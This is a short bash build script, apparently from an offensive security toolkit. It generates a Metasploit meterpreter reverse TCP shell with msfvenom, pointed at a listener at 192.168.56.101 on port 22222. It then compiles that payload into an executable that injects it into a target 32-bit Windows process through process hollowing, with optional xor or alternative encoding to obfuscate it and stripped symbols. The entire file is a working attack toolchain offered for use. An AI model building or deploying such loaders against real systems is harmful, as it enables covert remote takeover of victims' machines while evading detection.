#!/bin/bash          
# Script that builds a reverse tcp shell with metasploit and generates an executable
# that deploys the payload against a target 32 bit process via process hollowing.
#
# Include predefined win32 compiler
# >>> You can edit the compiler in build/global_win32.sh
# >>> or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# Assume empty defs.h, cleanup
echo "" > defs.h
# Generate reverse tcp shell payload via metasploit
# Adjust parameters to your needs
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=22222 -f exe -a x86 --platform Windows > payloads/revtcp32.exe
# Call make_bfg and compile the payload into the executable
# -H switch enables hollowing functionality
# Set -x flag to use xor obfuscation on the payload
# Set -a flag to use alternative encoding, which is a little more complex
# Set -p flag to print debug information during execution
./make_bfg -H payloads/revtcp32.exe -a
# Compile 
$win32_compiler -o bfg.exe bfg.c
# Remove debug symbols from generated executable
strip bfg.exe
# Cleanup
echo "" > defs.h
#
# Example usage of generated executable:
# bfg.exe target.exe
# target.exe is the target executable to be hollowed.
